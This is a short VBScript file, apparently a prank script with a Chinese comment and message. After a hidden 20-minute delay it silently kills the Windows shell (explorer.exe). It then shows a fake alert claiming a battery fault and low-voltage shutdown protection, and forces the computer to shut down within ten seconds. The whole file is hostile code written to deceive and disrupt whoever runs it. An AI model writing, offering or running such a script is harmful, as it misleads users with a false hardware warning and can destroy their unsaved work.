set WshShell = WScript.CreateObject("WScript.Shell") 
WScript.Sleep 1200000
'延迟20分钟执行

          CreateObject("WScript.Shell").Run "taskkill /f /im explorer.exe", 0

            msgbox"电池故障，电压过低关机保护电路",64
    dim W
   set W=wscript.createobject("wscript.shell") 
   W.run"shutdown -f -s -t 10",0